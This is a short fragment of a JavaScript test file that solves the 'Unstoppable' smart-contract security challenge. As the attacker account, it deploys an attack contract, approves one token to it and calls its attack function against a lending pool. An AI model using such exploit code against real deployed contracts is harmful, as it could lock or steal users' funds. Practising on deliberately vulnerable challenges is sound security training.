...
describe("[Challenge] Unstoppable", function () {
  ...
  it("Exploit", async function () {
    ...
    const UnstoppableAttack = await ethers.getContractFactory(
      "UnstoppableAttack"
    );

    this.unstoppableAttack = await UnstoppableAttack.connect(attacker).deploy(
      this.pool.address
    );

    await this.token
      .connect(attacker)
      .approve(this.unstoppableAttack.address, 1);

    await this.unstoppableAttack
      .connect(attacker)
      .attack(this.token.address, 1);
  });
